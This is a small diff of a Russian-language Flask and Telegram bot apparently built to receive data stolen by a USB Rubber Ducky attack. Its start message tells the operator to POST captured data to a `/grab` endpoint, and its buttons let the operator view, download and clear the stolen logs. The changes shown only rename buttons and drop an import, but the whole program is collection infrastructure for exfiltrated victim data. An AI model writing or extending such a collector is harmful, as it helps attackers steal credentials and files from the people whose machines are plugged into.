@@ -1,10 +1,9 @@
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify
 import telebot
 from telebot import types
 import json
 import os
 from datetime import datetime
-import io
 
 # ============================================================
 # ТОКЕН
@@ -27,7 +26,7 @@ def keyboard():
     kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     kb.add(
         types.KeyboardButton("📊 Логи"),
-        types.KeyboardButton("📥 Скачать последний"),
+        types.KeyboardButton("📥 Скачать"),
         types.KeyboardButton("📖 Инструкция"),
         types.KeyboardButton("🗑️ Очистить")
     )
@@ -40,7 +39,7 @@ def keyboard():
 def start(m):
     bot.send_message(
         m.chat.id,
-        "🪐 **DUCKY BOT v3.0**\n\n"
+        "🪐 **DUCKY BOT**\n\n"
         "Я принимаю данные от Rubber Ducky.\n"
         "Просто отправь POST на `/grab`\n\n"
         "Выбери действие:",
@@ -59,7 +58,7 @@ def show_logs(m):
         text += f"📄 `{f}`\n"
     bot.send_message(m.chat.id, text, parse_mode='Markdown')
 
-@bot.message_handler(func=lambda m: m.text == "📥 Скачать последний")
+@bot.message_handler(func=lambda m: m.text == "📥 Скачать")
 def download_last(m):
     files = get_logs()
     if not files:
